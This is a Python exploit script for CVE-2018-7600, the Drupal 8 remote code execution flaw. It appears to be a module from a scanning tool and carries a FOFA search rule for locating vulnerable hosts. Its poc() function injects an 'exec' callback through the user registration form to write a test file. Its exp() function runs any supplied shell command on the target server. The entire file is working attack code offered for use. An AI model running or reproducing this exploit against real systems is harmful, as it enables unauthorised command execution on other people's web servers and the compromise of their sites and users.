#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import re
import requests

from Config.config_requests import ua

requests.packages.urllib3.disable_warnings()

########################################################################################################################
# 脚本信息
NAME='CVE_2018_7600_8'
AUTHOR="RabbitMask"
REMARK='Drupal 8 RCE'
FOFA_RULE='app="Drupal-8"'
########################################################################################################################
# 漏洞检测模块
def poc(target):
    result={}
    url = target + '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
    payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec',
               'mail[#type]': 'markup', 'mail[#markup]': 'echo ";-)" | tee hello.txt'}
    headers = {"User-Agent":ua,
               "Content-Type": "application/hal+json"}
    try:
        requests.post(url, headers=headers,data=payload, verify=False)
        check = requests.get(target + '/hello.txt', verify=False)
        if check.status_code == 200 and ";-)" in check.text:
            result['target']=target
            result['poc']=NAME
            result['testurl']=target+'/hello.txt'
            return result
    except:
        pass

def exp(target,cmd):
    url = target + '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
    payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec',
               'mail[#type]': 'markup', 'mail[#markup]': cmd}
    headers = {"User-Agent":ua,
               "Content-Type": "application/hal+json"}
    try:
        requests.post(url, headers=headers,data=payload, verify=False)
    except:
        pass


if __name__ == '__main__':
    exp('http://127.0.0.1/','whoami | tee 1.txt')
